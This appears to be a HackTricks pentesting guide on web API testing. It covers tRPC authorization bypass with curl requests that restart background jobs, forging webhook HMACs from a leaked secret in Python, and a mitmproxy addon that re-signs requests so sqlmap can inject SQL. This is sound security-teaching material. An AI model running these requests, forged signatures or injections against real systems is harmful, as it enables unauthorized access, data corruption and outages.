# Web API Pentesting

{{#include ../../banners/hacktricks-training.md}}

## API Pentesting Methodology Summary

Pentesting APIs involves a structured approach to uncovering vulnerabilities. This guide encapsulates a comprehensive methodology, emphasizing practical techniques and tools.

### **Understanding API Types**

- **SOAP/XML Web Services**: Utilize the WSDL format for documentation, typically found at `?wsdl` paths. Tools like **SOAPUI** and **WSDLer** (Burp Suite Extension) are instrumental for parsing and generating requests. Example documentation is accessible at [DNE Online](http://www.dneonline.com/calculator.asmx).
- **REST APIs (JSON)**: Documentation often comes in WADL files, yet tools like [Swagger UI](https://swagger.io/tools/swagger-ui/) provide a more user-friendly interface for interaction. **Postman** is a valuable tool for creating and managing example requests.
- **GraphQL**: A query language for APIs offering a complete and understandable description of the data in your API.

### **Practice Labs**

- [**VAmPI**](https://github.com/erev0s/VAmPI): A deliberately vulnerable API for hands-on practice, covering the OWASP top 10 API vulnerabilities.

### **Effective Tricks for API Pentesting**

- **SOAP/XML Vulnerabilities**: Explore XXE vulnerabilities, although DTD declarations are often restricted. CDATA tags may allow payload insertion if the XML remains valid.
- **Privilege Escalation**: Test endpoints with varying privilege levels to identify unauthorized access possibilities.
- **CORS Misconfigurations**: Investigate CORS settings for potential exploitability through CSRF attacks from authenticated sessions.
- **Endpoint Discovery**: Leverage API patterns to discover hidden endpoints. Tools like fuzzers can automate this process.
- **Parameter Tampering**: Experiment with adding or replacing parameters in requests to access unauthorized data or functionalities.
- **HTTP Method Testing**: Vary request methods (GET, POST, PUT, DELETE, PATCH) to uncover unexpected behaviors or information disclosures.
- **Content-Type Manipulation**: Switch between different content types (x-www-form-urlencoded, application/xml, application/json) to test for parsing issues or vulnerabilities.
- **Advanced Parameter Techniques**: Test with unexpected data types in JSON payloads or play with XML data for XXE injections. Also, try parameter pollution and wildcard characters for broader testing.
- **Version Testing**: Older API versions might be more susceptible to attacks. Always check for and test against multiple API versions.

### Authorization & Business Logic (AuthN != AuthZ) — tRPC/Zod protectedProcedure pitfalls

Modern TypeScript stacks commonly use tRPC with Zod for input validation. In tRPC, `protectedProcedure` typically ensures the request has a valid session (authentication) but does not imply the caller has the right role/permissions (authorization). This mismatch leads to Broken Function Level Authorization/BOLA if sensitive procedures are only gated by `protectedProcedure`.

- Threat model: Any low-privileged authenticated user can call admin-grade procedures if role checks are missing (e.g., background migrations, feature flags, tenant-wide maintenance, job control).
- Black-box signal: `POST /api/trpc/<router>.<procedure>` endpoints that succeed for basic accounts when they should be admin-only. Self-serve signups drastically increase exploitability.
- Typical tRPC route shape (v10+): JSON body wrapped under `{"input": {...}}`.

Example vulnerable pattern (no role/permission gate):

```ts
// The endpoint for retrying a migration job
// This checks for a valid session (authentication)
retry: protectedProcedure
  // but not for an admin role (authorization).
  .input(z.object({ name: z.string() }))
  .mutation(async ({ input, ctx }) => {
    // Logic to restart a sensitive migration
  }),
```

Practical exploitation (black-box)

1) Register a normal account and obtain an authenticated session (cookies/headers).
2) Enumerate background jobs or other sensitive resources via “list”/“all”/“status” procedures.

```bash
curl -s -X POST 'https://<tenant>/api/trpc/backgroundMigrations.all' \
  -H 'Content-Type: application/json' \
  -b '<AUTH_COOKIES>' \
  --data '{"input":{}}'
```

3) Invoke privileged actions such as restarting a job:

```bash
curl -s -X POST 'https://<tenant>/api/trpc/backgroundMigrations.retry' \
  -H 'Content-Type: application/json' \
  -b '<AUTH_COOKIES>' \
  --data '{"input":{"name":"<migration_name>"}}'
```

Impact to assess

- Data corruption via non-idempotent restarts: Forcing concurrent runs of migrations/workers can create race conditions and inconsistent partial states (silent data loss, broken analytics).
- DoS via worker/DB starvation: Repeatedly triggering heavy jobs can exhaust worker pools and database connections, causing tenant-wide outages.

### Replaying leaked webhook HMACs

Exported low-code workflows (e.g., n8n JSON) often include the exact Crypto node used to verify signed webhooks: the secret, the hashing algorithm, and even the expression used to canonicalize the body (commonly `JSON.stringify($json.body)`). Once that documentation leaks, you can faithfully reproduce the signature and send arbitrary events into the automation pipeline:

1. Minify the JSON body the same way the workflow does so the byte-for-byte representation matches. In Python: `json.dumps(obj, separators=(',', ':')).encode()`.
2. Rebuild the HMAC with the leaked secret and hashing algorithm.
3. Overwrite the signature header enforced by the API gateway (e.g., `x-gophish-signature: sha256=<hex>`), then send the forged body to the webhook UUID.

```python
import json, hmac, hashlib

secret = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
payload = {"campaign_id": 2, "email": "attacker@corp", "message": "Clicked Link"}
body = json.dumps(payload, separators=(',', ':')).encode()
sig = hmac.new(secret, body, hashlib.sha256).hexdigest()
headers = {"Content-Type": "application/json", "x-gophish-signature": f"sha256={sig}"}
```

Whitespaces do not matter because `JSON.stringify` strips them; any change to the semantic content, however, requires recomputing the HMAC. Once the webhook accepts attacker-controlled JSON, every downstream node (databases, ticketing tools, mailers, etc.) becomes reachable even though the original API seemed “signed”.

### Proxy-based HMAC regeneration for automated testing

Automated scanners mutate payloads, so a static signature immediately becomes invalid. Drop a transparent proxy in front of your tooling that recomputes the HMAC before each request, allowing `sqlmap`, Intruder, or custom fuzzers to exercise the backend normally.

<details>
<summary>mitmproxy addon that re-signs JSON bodies</summary>

```python
#!/usr/bin/env python3
import hmac, hashlib, json
from mitmproxy import http

SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def request(flow: http.HTTPFlow) -> None:
    if not flow.request.content:
        return
    try:
        data = json.loads(flow.request.content)
        body = json.dumps(data, separators=(',', ':')).encode()
    except json.JSONDecodeError:
        body = flow.request.content
    signature = hmac.new(SECRET, body, hashlib.sha256).hexdigest()
    flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
```

</details>

Usage:

```bash
mitmproxy -s signature_proxy.py -p 8888 --mode regular
sqlmap -u "http://target/webhook/<uuid>" --proxy=http://127.0.0.1:8888 \
  --method POST --data '{"campaign_id":1,"email":"test","message":"Clicked"}' \
  --headers "Content-Type: application/json" -p email --dbms mysql --batch
```

Every time `sqlmap` mutates the JSON (e.g., injecting `"foo";SELECT SLEEP(5)#`), the proxy transparently recalculates the signature, keeping the request valid while you enumerate boolean-, error-, time-based, or stacked-query primitives behind the HMAC gate.

### **Tools and Resources for API Pentesting**

- [**kiterunner**](https://github.com/assetnote/kiterunner): Excellent for discovering API endpoints. Use it to scan and brute force paths and parameters against target APIs.

```bash
kr scan https://domain.com/api/ -w routes-large.kite -x 20
kr scan https://domain.com/api/ -A=apiroutes-220828 -x 20
kr brute https://domain.com/api/ -A=raft-large-words -x 20 -d=0
kr brute https://domain.com/api/ -w /tmp/lang-english.txt -x 20 -d=0
```

- [**https://github.com/BishopFox/sj**](https://github.com/BishopFox/sj): sj is a command line tool designed to assist with auditing of **exposed Swagger/OpenAPI definition files** by checking the associated API endpoints for weak authentication. It also provides command templates for manual vulnerability testing.
- Additional tools like **automatic-api-attack-tool**, **Astra**, and **restler-fuzzer** offer tailored functionalities for API security testing, ranging from attack simulation to fuzzing and vulnerability scanning.
- [**Cherrybomb**](https://github.com/blst-security/cherrybomb): It's an API security tool that audit your API based on an OAS file(the tool written in rust).

### **Learning and Practice Resources**

- **OWASP API Security Top 10**: Essential reading for understanding common API vulnerabilities ([OWASP Top 10](https://github.com/OWASP/API-Security/blob/master/2019/en/dist/owasp-api-security-top-10.pdf)).
- **API Security Checklist**: A comprehensive checklist for securing APIs ([GitHub link](https://github.com/shieldfy/API-Security-Checklist)).
- **Logger++ Filters**: For hunting API vulnerabilities, Logger++ offers useful filters ([GitHub link](https://github.com/bnematzadeh/LoggerPlusPlus-API-Filters)).
- **API Endpoints List**: A curated list of potential API endpoints for testing purposes ([GitHub gist](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d)).

## References

- [https://github.com/Cyber-Guy1/API-SecurityEmpire](https://github.com/Cyber-Guy1/API-SecurityEmpire)
- [How An Authorization Flaw Reveals A Common Security Blind Spot: CVE-2025-59305 Case Study](https://www.depthfirst.com/post/how-an-authorization-flaw-reveals-a-common-security-blind-spot-cve-2025-59305-case-study)
- [0xdf – HTB WhiteRabbit (leaked webhook HMAC → SQLi)](https://0xdf.gitlab.io/2025/12/13/htb-whiterabbit.html)

{{#include ../../banners/hacktricks-training.md}}
